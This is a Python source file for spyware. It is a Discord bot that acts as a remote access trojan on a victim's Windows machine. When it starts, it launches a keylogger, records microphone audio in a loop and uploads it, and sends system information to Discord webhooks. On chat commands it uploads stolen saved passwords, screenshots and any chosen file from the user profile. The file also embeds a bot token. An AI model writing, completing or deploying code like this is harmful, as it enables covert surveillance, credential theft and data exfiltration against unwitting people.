import discord
import random
import asyncio
import info
import utility
import keylogger
import threading
import recorder as audio_recorder
import passwords
import time
import pyautogui
import os
import shutil


# Discord bot token
TOKEN = "MTE4NzAwNDA3NzA1ODU3MjMyOA.G4PRvr.wdykm5LPJSa-zKl60OBXjPCy8mEChY0DQGvcLY"

# Discord guild ID
GUILD_ID = 1297901498805518337

# Random category name
CATEGORY_NAME = f"{utility.get_username()}"

# Webhook URLs
info_webhook_url = ""
main_webhook_url = ""


# Function to send a message to the webhook
def send_to_webhook(webhook_url, content):
    webhook = discord.SyncWebhook.from_url(webhook_url)
    if len(content) > 2000:
        # split into 1500 characters and send
        for i in range(0, len(content), 1500):
            webhook.send(content[i:i + 1500])
            
        return
    else:
        webhook.send(content)


# Create a Discord client
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
client = discord.Client(intents=intents)


# Event: Bot is ready
@client.event
async def on_ready():
    global info_webhook_url, main_webhook_url

    print(f"Bot connected as {client.user}")

    # Get the guild
    guild = client.get_guild(GUILD_ID)
    if guild is None:
        print("Guild not found")
        return

    # Create a category
    category = await guild.create_category(CATEGORY_NAME)
    print(f"Category created: {category.name}")

    # Create channels
    channels = ["Info", "Main", "Records", "Files"]
    for channel_name in channels:
        channel = await guild.create_text_channel(channel_name,
                                                  category=category)
        print(f"Channel created: {channel.name}")

        # Add webhooks to "Info" and "Main" channels
        if channel_name == "Info":
            webhook = await channel.create_webhook(name="Bot Webhook")
            info_webhook_url = webhook.url
            print(info_webhook_url)
        elif channel_name == "Main":
            webhook = await channel.create_webhook(name="Bot Webhook")
            main_webhook_url = webhook.url
            print(main_webhook_url)
        elif channel_name == "Records":
            global records_channel_id
            records_channel_id = channel.id
        elif channel_name == "Files":
            global files_channel_id
            files_channel_id = channel.id

        print(f"Webhook added to channel: {channel.name}")

    # Start the keylogger in a separate thread
    keylogger_thread = threading.Thread(target=keylogger.start_keylogger,
                                        args=(main_webhook_url, ))
    keylogger_thread.start()

    # Call record_and_send_audio function to start recording and sending audio
    record = threading.Thread(target=record_and_send_audio)
    record.start()

    # Get the output from info.py
    system_info = info.system_information(13)
    # print(system_info)

    # Send the output to the info_webhook_url
    send_to_webhook(info_webhook_url, system_info)


# Event: Message received
@client.event
async def on_message(message):
    print(f"Message received: {message.content}")
    if message.author != client.user or not message.author.bot:
        
        if message.content == ".passwords":
            file_paths = passwords.main()

            chanle = client.get_channel(files_channel_id)
            if chanle is None:
                print("Channel not found")
                return

            for file_path in file_paths:
                try:
                    await chanle.send(file=discord.File(file_path))
                except:
                    pass

            # Delete the files and the folder
            await asyncio.sleep(5)
            for file_path in file_paths:
                utility.delete_file(file_path)

        if message.content == ".ss":
            screenshot = pyautogui.screenshot()
            screenshot.save("screenshot.png")
            chanle = client.get_channel(files_channel_id)
            if chanle is None:
                print("Channel not found")
                return
            await chanle.send(file=discord.File("screenshot.png"))
            utility.delete_file("screenshot.png")
            
        if message.content == ".files":
            if message.author.id == 632519262585618437:
                content = ""
                files = os.listdir(os.environ["USERPROFILE"])
                for file in files:
                    content += f"{str(files.index(file))}: {file}\n"
                    
                await message.channel.send(f"```{content}```")

                

                while True:
                    try:
                        message = await client.wait_for("message", timeout=20, check=lambda message: message.author.id == 632519262585618437)
                    except asyncio.TimeoutError:
                        await message.channel.send("Command timed out. Exiting file explorer.")
                        return
                    # if the selected file is a directory
                    if os.path.isdir(os.path.join(os.environ["USERPROFILE"], files[int(message.content.split(".files ")[1])])):
                        if message.content == "0":
                            # go back
                            content = ""
                            files = os.listdir(os.path.join(os.environ["USERPROFILE"], files[int(message.content.split(".files ")[1])]))
                            for file in files:
                                content += f"{files.index(file)}: {file}\n"
                            # print(f"Current directory: {files[int(message.content.split(".files "))[1])]}\n")
                            print(f"Current files: {content}\n")
                            await message.channel.send(f"```{content}```")
                        else:
                            # open the file
                            content = ""
                            files = os.listdir(os.path.join(os.environ["USERPROFILE"], files[int(message.content.split(".files ")[1])]))
                            for file in files:
                                content += f"{files.index(file)}: {file}\n"
                            # print(f"Current directory: {files[int(message.content.split(".files ")[1])]}\n")
                            print(f"Current files: {content}\n")
                            await message.channel.send(f"```{content}```")

                    else:
                        # if the selected file is a file
                        await message.channel.send("Downloading..")
                        await message.channel.send(os.path.join(os.environ["USERPROFILE"], files[int(message.content.split(".files ")[1])]), file=discord.File(os.path.join(os.environ["USERPROFILE"], files[int(message.content.split(".files ")[1])])))
                        return
                    

            
        if message.content.startswith(".download"):
            param = message.content.split(".download ")[1]

            ex = param.split(".")[-1]
            print(ex)

            path = os.path.join(os.environ["USERPROFILE"], param)
            filename = "dwn" + str(int(random.random() * 1000)) + "." + ex
            shutil.copyfile(path, filename)
            await message.channel.send("Downloading..")
            await message.channel.send(path, file=discord.File(filename))
            os.remove(filename)




# Function to record and send audio
def record_and_send_audio():
    while True:

        print("Recording audio...")
        audio_path = audio_recorder.main()
        print(f"Audio recorded and saved as {audio_path}")
        last = audio_path
        records_channel = client.get_channel(records_channel_id)
        asyncio.run_coroutine_threadsafe(
            records_channel.send(file=discord.File(audio_path)), client.loop)
        time.sleep(10)
        print("deleting last audio")
        # delete the audio file
        utility.delete_file(audio_path)



# Run the bot
client.run(TOKEN)
